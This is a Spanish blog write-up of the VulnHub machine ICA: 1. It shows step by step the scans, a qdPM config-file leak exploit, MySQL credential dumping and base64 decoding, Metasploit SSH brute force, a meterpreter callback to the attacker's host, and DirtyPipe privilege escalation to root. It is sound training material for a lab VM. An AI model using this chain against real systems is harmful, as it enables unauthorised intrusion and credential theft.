@@ -1,0 +1,598 @@
+---
+layout: post
+
+title: "Writeup ICA 1"
+excerpt: 'En este post te llevo paso a paso por la máquina ICA: 1, un desafío de nivel fácil disponible en VulnHub. Diseñada para quienes desean mejorar en el pentesting, esta máquina nos reta a descubrir un misterioso proyecto'
+
+category: writeups
+category_label: "Writeups"
+primary_category_anchor: writeups
+categories:
+  - writeups
+kicker: "Writeups"
+kicker_secondary: "VulnHub"
+tags:
+- 'VulnHub'
+
+post_title: "Writeup ICA 1"
+description: "En este post te llevo paso a paso por la máquina ICA: 1, un desafío de nivel fácil disponible en VulnHub. Diseñada para quienes desean mejorar en el pentesting, esta máquina nos reta a descubrir un misterioso proyecto"
+
+slug: writeup-ica-1
+permalink: /blog/writeups/writeup-ica-1.html
+
+nav: blog
+
+featured: false
+featured_badge: ""
+featured_lines:
+  - "Searchsploit"
+  - "MySQL"
+  - "Base64"
+
+cover_badge: "VulnHub"
+cover_lines:
+  - "Searchsploit"
+  - "MySQL"
+  - "Base64"
+
+cover_image: /assets/img/blog/ICA1/featured_image_ICA.jpg
+
+reading_time: "8 min de lectura"
+date: 2024-12-01 10:00:00 +0100
+
+toc_html: |
+  <a href="#descripcion">Descripción</a>
+  <a href="#resolucion-de-la-maquina">Resolucion de la maquina</a>
+
+---
+
+<p>En este post te llevo paso a paso por la máquina ICA: 1, un desafío de nivel fácil disponible en VulnHub. Diseñada para quienes desean mejorar en el pentesting, esta máquina nos reta a descubrir un misterioso proyecto secreto. ¿Listo para desentrañar los secretos de ICA?</p>
+<h2 id="descripcion">Descripción</h2>
+<p>Según la información de nuestra red de inteligencia, la ICA está trabajando en un proyecto secreto. Necesitamos descubrir de qué se trata. Una vez que obtengas la información de acceso, envíanosla. Colocaremos una puerta trasera para acceder al sistema más adelante. Tú solo concéntrate en descubrir en qué consiste el proyecto. Probablemente tendrás que atravesar varias capas de seguridad. La Agencia tiene plena confianza en que completarás esta misión con éxito. ¡Buena suerte, Agente!</p>
+<h2 id="resolucion-de-la-maquina">Resolucion de la maquina</h2>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image.png"/></p>
+<h3>Fase de Fingerprinting / Reconocimiento (Reconnaissance):</h3>
+<h4>Descubrimiento de IP objetivo en la red</h4>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-2.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-1.png"/></p>
+<h4>Descubrimiento de puertos y servicios en el host objetivo</h4>
+<p>Realizo un descubrimiento de todos los puertos de la maquina objetivo.</p>
+<pre><code class="language-sh">nmap -p- 192.168.88.7 
+</code></pre>
+<p>Obtengo la siguiente lista de puertos de la maquina:</p>
+<pre><code class="language-sh">PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+3306/tcp  open  mysql
+33060/tcp open  mysqlx
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-3.png"/></p>
+<p>Realizo un escaneo con mas profundidad sobre los puertos detectados, buscando los servicios tras los puertos, asi como la ejecucion de scripts basicos para detectar vulnerabilidades y este resultado lo almacenare en diferentes formatos con nombre nmap_ICA</p>
+<pre><code class="language-sh">sudo nmap -p22,80,3306,33060 -sS -sC -sV -O 192.168.88.7 -oA nmap_ICA
+</code></pre>
+<p>Obtengo el siguiente resultado:</p>
+<h5>Puerto 22 - SSH</h5>
+<pre><code class="language-sh">PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 0e:77:d9:cb:f8:05:41:b9:e4:45:71:c1:01:ac:da:93 (RSA)
+|   256 40:51:93:4b:f8:37:85:fd:a5:f4:d7:27:41:6c:a0:a5 (ECDSA)
+|_  256 09:85:60:c5:35:c1:4d:83:76:93:fb:c7:f0:cd:7b:8e (ED25519)
+</code></pre>
+<h5>Puerto 80 - HTTP</h5>
+<pre><code class="language-sh">PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.48 ((Debian))
+|_http-title: qdPM | Login
+|_http-server-header: Apache/2.4.48 (Debian)
+</code></pre>
+<h5>Puerto 3306 - MYSQL</h5>
+<pre><code class="language-sh">PORT      STATE SERVICE VERSION
+3306/tcp  open  mysql   MySQL 8.0.26
+| mysql-info: 
+|   Protocol: 10
+|   Version: 8.0.26
+|   Thread ID: 42
+|   Capabilities flags: 65535
+|   Some Capabilities: IgnoreSigpipes, SwitchToSSLAfterHandshake, SupportsLoadDataLocal, LongColumnFlag, InteractiveClient, FoundRows, LongPassword, Support41Auth, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, ODBCClient, Speaks41ProtocolOld, SupportsTransactions, Speaks41ProtocolNew, ConnectWithDatabase, SupportsCompression, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
+|   Status: Autocommit
+|   Salt: T\x1E5H5\x11\x15\x14]`J{\x1CRW\x19\x0B\x1F[6
+|_  Auth Plugin Name: caching_sha2_password
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=MySQL_Server_8.0.26_Auto_Generated_Server_Certificate
+| Not valid before: 2021-09-25T10:47:29
+|_Not valid after:  2031-09-23T10:47:29
+</code></pre>
+<h5>Puerto 33060 - MYSQLX</h5>
+<pre><code class="language-sh">PORT      STATE SERVICE VERSION
+33060/tcp open  mysqlx?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message"
+|     HY000
+|   LDAPBindReq: 
+|     *Parse error unserializing protobuf message"
+|     HY000
+|   oracle-tns: 
+|     Invalid message-frame."
+|_    HY000
+</code></pre>
+<h5>Informacion General de la maquina.</h5>
+<pre><code class="language-sh">Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+</code></pre>
+<h3>Fase de Footprinting / Exploración (Scanning):</h3>
+<h4>Exploracion puerto 80</h4>
+<p>Realizo una exploracion visual mediante el navegador al puerto 80 de la ip de la maquina objetivo.</p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-4.png"/></p>
+<p>La pagina de acceso me da la bienvenida a un servicio llamado qdPM, ofreciendo un login.</p>
+<p>Veo que indica la versión 9.2 de qdPM. Voy a comprobar si esta version tiene vulnerabilidades conocidas mediante <strong>searchsploit</strong></p>
+<pre><code class="language-sh">searchsploit qdPM 9.2
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-6.png"/></p>
+<p>Copio el exploit a mi directorio de trabajo.</p>
+<pre><code class="language-sh">searchsploit -m 50176
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-7.png"/></p>
+<p>Compruebo el exploit, para ver cuales son las instrucciones para usarlo.</p>
+<pre><code class="language-sh">cat 50176.txt
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-8.png"/></p>
+<p>En las instrucciones me indican que la clave y la password de conexion a la base de datos esta guardada en un fichero de configuracion yml al que se puede acceder en una direccion web.</p>
+<p>Descargo el fichero usando la ruta de la URL en la maquina objetivo.</p>
+<pre><code class="language-sh">wget http://192.168.88.7/core/config/databases.yml
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-9.png"/></p>
+<p>Compruebo el fichero descargado:</p>
+<pre><code class="language-sh">cat databases.yml
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-10.png"/></p>
+<pre><code class="language-sh">all:
+  doctrine:
+    class: sfDoctrineDatabase
+    param:
+      dsn: 'mysql:dbname=qdpm;host=localhost'
+      profiler: false
+      username: qdpmadmin
+      password: "&lt;?php echo urlencode('UcVQCMQk2STVeS6J') ; ?&gt;"
+      attributes:
+        quote_identifier: true 
+</code></pre>
+<p>He obtenido credenciales para una base de datos en mysql llamada qdpm.</p>
+<h4>Exploracion puerto 3306</h4>
+<p>Para realizar la enumeracion del puerto 3306 - MYSQL usaré modulos de  <strong>metasploit</strong></p>
+<h5>Obtencion de la version de mysql</h5>
+<p>Uso el modulo auxiliar mysql_version.</p>
+<pre><code class="language-sh">use auxiliary/scanner/mysql/mysql_version
+options
+setg RHOSTS 192.168.88.7
+exploit
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-14.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-15.png"/></p>
+<p>Obtengo que la version de MySQL que esta corriendo en la maquina es la 8.0.26.</p>
+<h5>Enumeracion de mysql</h5>
+<p>Usaré el modulo mysql_enum para enumerar el puerto 3306 y obtener usuarios y hashes de conntraseñas, mediante el uso de las credenciales descubierta en la enumeracion del puerto 80.</p>
+<pre><code class="language-sh">use auxiliary/admin/mysql/mysql_enum
+set username qdpmadmin
+set password UcVQCMQk2STVeS6J
+exploit
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-16.png"/></p>
+<h5>Enumeracion de Esquema de las bases de datos.</h5>
+<p>Usare el modulo mysql_schemadump para obtener el esquema de las bases de datos del servidor mysql.</p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-18.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-17.png"/></p>
+<h3>Explotación</h3>
+<h4>Explotacion puerto 3306</h4>
+<p>Para explotar el servicio de mysql me conecto al servicio con las credenciales obtenidas.</p>
+<pre><code class="language-sh">mysql -u qdpmadmin -p -h 192.168.88.7 -P 3306 
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-11.png"/></p>
+<p>Compruebo cuales bases de datos existen.</p>
+<pre><code class="language-sql">SHOW DATABASES;
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-12.png"/></p>
+<p>Accedo a la base de datos qdpm ya que supongo que sera la base de datos de la aplicacion web y podre obtener algun usuario.</p>
+<pre><code class="language-sql">USE qdpm
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-19.png"/></p>
+<p>Compruebo las tablas que existen en la base de datos qdpm.</p>
+<pre><code class="language-sql">SHOW TABLES;
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-20.png"/></p>
+<pre><code class="language-sh">+----------------------+
+| Tables_in_qdpm       |
++----------------------+
+| attachments          |
+| configuration        |
+| departments          |
+| discussions          |
+| discussions_comments |
+| discussions_reports  |
+| discussions_status   |
+...
+| tickets              |
+| tickets_comments     |
+| tickets_reports      |
+| tickets_status       |
+| tickets_types        |
+| user_reports         |
+| users                |
+| users_groups         |
+| versions             |
+| versions_status      |
++----------------------+
+35 rows in set (0.005 sec)
+</code></pre>
+<p>La tabla users llama mi atencion y compruebo su contenido</p>
+<pre><code class="language-sql">select * from users;
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-37.png"/></p>
+<p>Esta consulta me indica que la base de datos esta vacia, por lo que cambio de base de datos qdpm a base de datos staff y consulto las tablas de las que dispone.</p>
+<pre><code class="language-sh">USE staff;
+SHOW TABLES;
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-26.png"/></p>
+<p>Consulto el contenido de la tabla <code>user</code></p>
+<pre><code class="language-sql">select * from user;
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-27.png"/></p>
+<p>Consulto el contenido de la tabla <code>department</code></p>
+<pre><code class="language-sql">select * from department;
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-38.png"/></p>
+<p>Consulto el contenido de la tabla <code>login</code></p>
+<pre><code class="language-sql">select * from login;
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-39.png"/></p>
+<p>En esta tabla vemos que existe un campo password. Observando los valores veo que parece que estan codificados en base64.</p>
+<p>Voy a unir las tablas user y login para obtener la relacion entre usuarios y claves.</p>
+<pre><code class="language-sql">SELECT user.name AS nombre, login.password AS clave FROM user JOIN login ON user.id = login.user_id;
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-41.png"/></p>
+<p>Como los valores de las claves estan en base64 puedo hacer la decodificacion directamente en SQL mediante la funcion <code>FROM_BASE64()</code></p>
+<pre><code class="language-sql">SELECT user.name AS nombre, login.password AS clave, FROM_BASE64(login.password) AS decoded_password FROM user JOIN login ON user.id = login.user_id;
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-42.png"/></p>
+<pre><code class="language-txt">+---------+--------------------------+------------------+
+| nombre  | clave                    | decoded_password |
++---------+--------------------------+------------------+
+| Lucas   | c3VSSkFkR3dMcDhkeTNyRg== | suRJAdGwLp8dy3rF |
+| Dexter  | N1p3VjRxdGc0MmNtVVhHWA== | 7ZwV4qtg42cmUXGX |
+| Smith   | WDdNUWtQM1cyOWZld0hkQw== | X7MQkP3W29fewHdC |
+| Travis  | REpjZVZ5OThXMjhZN3dMZw== | DJceVy98W28Y7wLg |
+| Meyer   | Y3FObkJXQ0J5UzJEdUpTeQ== | cqNnBWCByS2DuJSy |
++---------+--------------------------+------------------+
+</code></pre>
+<p>Creo ficheros con los nombres y las claves descodificadas.</p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-46.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-33.png"/></p>
+<p>Voy a crear un fichero de nombres de usuario basandome en los nombres de las personas obtenida en la base de datos.</p>
+<p>Para esto creo un fichero de script en bash llamado <code>procesar_nombres.sh</code>. Este script se alimentará por parametros del fichero de nombres y en parametros tambien le diré cual sera el fichero de salida a generar.</p>
+<p>El script usará los nombres del fichero para darme los mismos nombres tanto en mayusculas como en minusculas y escribira una linea con cada generacion de usuario.</p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-43.png"/></p>
+<p>El codigo del script es el siguiente:</p>
+<pre><code class="language-sh">#!/bin/bash
+
+# Verificar que se han proporcionado los nombres de archivo de entrada y salida
+if [ $# -lt 2 ]; then
+    echo "Uso: $0 &lt;archivo_entrada&gt; &lt;archivo_salida&gt;"
+    exit 1
+fi
+
+# Archivo de entrada y salida
+archivo_entrada="$1"
+archivo_salida="$2"
+
+# Verificar si el archivo de entrada existe
+if [ ! -f "$archivo_entrada" ]; then
+    echo "Error: El archivo $archivo_entrada no existe."
+    exit 1
+fi
+
+# Registrar el tiempo de inicio en milisegundos
+inicio=$(date +%s%3N)
+
+# Limpiar o crear el archivo de salida
+&gt; "$archivo_salida"
+
+# Leer cada nombre del archivo de entrada
+while read -r nombre || [[ -n "$nombre" ]]; do
+    # Convertir a mayúsculas y minúsculas
+    mayusculas=$(echo "$nombre" | tr '[:lower:]' '[:upper:]')
+    minusculas=$(echo "$nombre" | tr '[:upper:]' '[:lower:]')
+
+    # Escribir cada variante en una línea separada en el archivo de salida
+    echo "$nombre" &gt;&gt; "$archivo_salida"
+    echo "$mayusculas" &gt;&gt; "$archivo_salida"
+    echo "$minusculas" &gt;&gt; "$archivo_salida"
+done &lt; "$archivo_entrada"
+
+# Calcular tiempo de finalización en milisegundos
+fin=$(date +%s%3N)
+duracion=$((fin - inicio))
+
+# Contar las palabras generadas en el archivo de salida
+palabras=$(wc -l &lt; "$archivo_salida")
+
+# Mostrar estadísticas
+echo "Procesamiento completo."
+echo "Resultados guardados en $archivo_salida"
+echo "Palabras generadas: $palabras"
+echo "Tiempo de ejecución: ${duracion} milisegundos"
+</code></pre>
+<p>Una vez creado el script lo guardo y compruebo sus permisos de ejecucion</p>
+<p>ls -l procesar_nombres.sh</p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-44.png"/></p>
+<p>chmod +x procesar_nombres.sh</p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-45.png"/></p>
+<p>Ahora ejecuto el script creado pasandole como parametros el fichero de nombres que cree y dandole un archivo de salida.</p>
+<pre><code class="language-sh">procesar_nombres.sh nombres.txt usuarios.txt
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-47.png"/></p>
+<p>Compruebo su contenido para verificar que es lo esperado.</p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-48.png"/></p>
+<h4>Explotacion del servicio SSH</h4>
+<p>Con la lista de usuarios generada voy a intentar usarlas para obtener acceso al sistema mediante el servicio SSH.</p>
+<p>Para ello usare el modulo ssh_login de metasploit que me permite hacer fuerza bruta al servicio con los ficheros de usuario y claves que tengo.</p>
+<pre><code class="language-bash">msfconsole -q
+search ssh_login
+use auxiliary/scanner/ssh/ssh_login
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-49.png"/></p>
+<pre><code class="language-sh">set PASS_FILE pass.txt
+set USER_FILE usuarios.txt
+set verbose true
+exploit
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-50.png"/></p>
+<p>Espero que se ejecute el ataque. En los resultados veo que se consiguen dos sesiones ssh al servidor, una con el usuario <code>dexter</code> y otra con el usuario <code>travis</code>.</p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-51.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-52.png"/></p>
+<p>Puedo consultar las sesiones abiertas con el comando <code>sessions</code></p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-53.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-55.png"/></p>
+<p>Voy a upgradear la sesion 1 a una sesion de meterpreter para poder usar mas adelante modulos de enumeracion en la maquina objetivo.</p>
+<p>Para esto uso el modulo <code>shell_to_meterpreter</code></p>
+<pre><code class="language-sh">use post/multi/manage/shell_to_meterpreter
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-56.png"/></p>
+<p>Defino la sesion 1 y la IP para el localhost contra la que devolvera la sesion de meterpreter.</p>
+<pre><code class="language-sh">set session 1
+set LhOST 192.168.88.3
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-57.png"/></p>
+<p>Lanzo el modulo con el comando <code>exploit</code></p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-58.png"/></p>
+<p>Compruebo con el comando <code>sessions</code> que tengo una session 3 de tipo meterpreter</p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-59.png"/></p>
+<p>abro la session 3 de forma interactiva.</p>
+<pre><code class="language-sh">sessions -i 3
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-60.png"/></p>
+<h3>Enumeracion local del sistema</h3>
+<p>Ahora que he comprobado que tengo acceso a la session 3 mediante meterpreter, voy a pasarla de nuevo al background para hacer la enumeracion mediante modulos de metasploit.</p>
+<pre><code class="language-sh">background
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-61.png"/></p>
+<h4>Enumeracion local de la red en la maquina objetivo.</h4>
+<p>Para la enumeracion local de la red en la maquina objetivo voy a usar el <strong>modulo de postexplotacion enum_network</strong></p>
+<pre><code class="language-sh">use post/linux/gather/enum_network
+</code></pre>
+<p>Compruebo las opciones requeridas para lanzarlo con el comando <code>options</code></p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-66.png"/></p>
+<p>Ejecuto con <code>run</code> el modulo y comienza a hacer la enumeracion volcando la informacion en unos ficheros dentro de la carpeta <strong><code>/home/kali/.msf4/loot/</code></strong></p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-67.png"/></p>
+<p>Los ficheros que obtengo son los siguientes:</p>
+<table>
+<thead>
+<tr>
+<th>Configuracion</th>
+<th>fichero acabado en...</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Network config</td>
+<td>linux.enum.netwo_435546.txt</td>
+</tr>
+<tr>
+<td>Route table</td>
+<td>linux.enum.netwo_728552.txt</td>
+</tr>
+<tr>
+<td>DNS config</td>
+<td>linux.enum.netwo_338080.txt</td>
+</tr>
+<tr>
+<td>SSHD config</td>
+<td>linux.enum.netwo_975563.txt</td>
+</tr>
+<tr>
+<td>Host file</td>
+<td>linux.enum.netwo_840574.txt</td>
+</tr>
+<tr>
+<td>Active connections</td>
+<td>linux.enum.netwo_615940.txt</td>
+</tr>
+<tr>
+<td>Wireless information</td>
+<td>linux.enum.netwo_542351.txt</td>
+</tr>
+<tr>
+<td>Listening ports</td>
+<td>linux.enum.netwo_207902.txt</td>
+</tr>
+<tr>
+<td>If-Up/If-Down</td>
+<td>linux.enum.netwo_951546.txt</td>
+</tr>
+</tbody>
+</table>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-68.png"/></p>
+<p>Podemos consultar el contenido de ellos con el comando <code>cat</code>. Por ejemplo si quisiera ver el resultado de la enumeracion de la configuracion de red usaria:</p>
+<pre><code class="language-sh">cat 20241201065015_default_192.168.88.7_linux.enum.netwo_435546.txt
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-69.png"/></p>
+<h4>Enumeracion local de la configuraciones en la maquina objetivo.</h4>
+<p>Para ello usare el modulo:</p>
+<pre><code class="language-sh">use post/linux/gather/enum_configs
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-64.png"/></p>
+<p>Obtenemos la siguiente informacion que se almacena en ficheros.</p>
+<table>
+<thead>
+<tr>
+<th>Configuracion</th>
+<th>fichero acabado en...</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>apache2.conf</td>
+<td>linux.enum.conf_820557.txt</td>
+</tr>
+<tr>
+<td>ports.conf</td>
+<td>linux.enum.conf_421813.txt</td>
+</tr>
+<tr>
+<td>my.cnf</td>
+<td>linux.enum.conf_913290.txt</td>
+</tr>
+<tr>
+<td>shells</td>
+<td>linux.enum.conf_703254.txt</td>
+</tr>
+<tr>
+<td>sepermit.conf</td>
+<td>linux.enum.conf_986293.txt</td>
+</tr>
+<tr>
+<td>ca-certificates.conf</td>
+<td>linux.enum.conf_507790.txt</td>
+</tr>
+<tr>
+<td>access.conf</td>
+<td>linux.enum.conf_140621.txt</td>
+</tr>
+<tr>
+<td>rpc</td>
+<td>linux.enum.conf_176857.txt</td>
+</tr>
+<tr>
+<td>logrotate.conf</td>
+<td>linux.enum.conf_908148.txt</td>
+</tr>
+<tr>
+<td>ldap.conf</td>
+<td>linux.enum.conf_313793.txt</td>
+</tr>
+<tr>
+<td>sysctl.conf</td>
+<td>linux.enum.conf_398036.txt</td>
+</tr>
+</tbody>
+</table>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-65.png"/></p>
+<h4>Enumeracion local de informacion del sistema en la maquina objetivo.</h4>
+<p>Para esta enumeracion utilizaré:</p>
+<pre><code class="language-sh">use post/linux/gather/enum_system
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-70.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-71.png"/></p>
+<table>
+<thead>
+<tr>
+<th>Configuracion</th>
+<th>fichero acabado en...</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Linux version</td>
+<td>linux.enum.syste_288009.txt</td>
+</tr>
+<tr>
+<td>User accounts</td>
+<td>linux.enum.syste_160341.txt</td>
+</tr>
+<tr>
+<td>Installed Packages</td>
+<td>linux.enum.syste_775955.txt</td>
+</tr>
+<tr>
+<td>Running Services</td>
+<td>linux.enum.syste_388500.txt</td>
+</tr>
+<tr>
+<td>Cron jobs</td>
+<td>linux.enum.syste_686066.txt</td>
+</tr>
+<tr>
+<td>Disk info</td>
+<td>linux.enum.syste_803251.txt</td>
+</tr>
+<tr>
+<td>Logfiles</td>
+<td>linux.enum.syste_298740.txt</td>
+</tr>
+<tr>
+<td>Setuid/setgid files</td>
+<td>linux.enum.syste_899019.txt</td>
+</tr>
+<tr>
+<td>CPU Vulnerabilities</td>
+<td>linux.enum.syste_831385.txt</td>
+</tr>
+</tbody>
+</table>
+<p>Obtengo los siguientes ficheros:</p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-72.png"/></p>
+<p>Compruebo si existen trabajos cron del usuario con el que enumero.</p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-73.png"/></p>
+<h3>Elevacion de privilegios</h3>
+<p>Para comprobar que vulnerabilidades puedo explotar en la maquina objetivo una vez que tengo acceso a ella con una sesion de meterpreter puedo usar el modulo <strong><code>local_exploit_suggester</code></strong>.</p>
+<p>Indicaré que sesion de meterpreter quiero usar y lo ejecutaré.</p>
+<pre><code class="language-sh">use post/multi/recon/local_exploit_suggester
+set session 3
+exploit
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-76.png"/></p>
+<p>Espero que termine la comprobacion de vulnerabilidades.</p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-77.png"/></p>
+<p>Obtengo la siguiente tabla de vulnerabilidades disponibles para probar que pueden tener bastante exito.</p>
+<pre><code class="language-txt">
+#   Name                                                               Potentially Vulnerable?  Check Result
+ -   ----                                                               -----------------------  ------------
+ 1   exploit/linux/local/cve_2022_0847_dirtypipe                        Yes                      The target appears to be vulnerable. Linux kernel version found: 5.10.0                                                    
+ 2   exploit/linux/local/glibc_tunables_priv_esc                        Yes                      The target appears to be vulnerable. The glibc version (2.31-13) found on the target appears to be vulnerable              
+ 3   exploit/linux/local/netfilter_priv_esc_ipv4                        Yes                      The target appears to be vulnerable.                                                                                       
+ 4   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.                                                                                       
+ 5   exploit/linux/local/sudoedit_bypass_priv_esc                       Yes                      The target appears to be vulnerable. Sudo 1.9.5p2.pre.3 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module                
+
+</code></pre>
+<p>Comenzaré probando la vulnerabilidad <code>cve_2022_0847_dirtypipe</code></p>
+<p>En primer lugar me informo de la vulnerabilidad:</p>
+<pre><code class="language-sh">info exploit/linux/local/cve_2022_0847_dirtypipe  
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-80.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-81.png"/></p>
+<p>Defino la session a usar, la ip de mi maquina atacante y un puerto libre de mi maquina</p>
+<pre><code class="language-sh">set session 3
+set LHOST 192.168.88.3
+set LPORT 7331
+</code></pre>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-82.png"/></p>
+<p>Compruebo que todo esta en orden con el comando <code>options</code></p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-83.png"/></p>
+<p>Ejecuto el exploit obteniendo una sesion de meterpreter.</p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-84.png"/></p>
+<p>Compruebo en esta sesion de meterpreter que usuario soy y me da que soy root en la maquina objetivo.</p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-85.png"/></p>
+<p>Abro una shell desde meterpreter, y compruebo el contenido de la carpeta <strong><code>/root</code></strong> y consulto la flag root.txt</p>
+<p><img alt="alt text" src="/assets/img/blog/ICA1/image-86.png"/></p>
+<p>Con esto queda resuelta la maquina.</p>
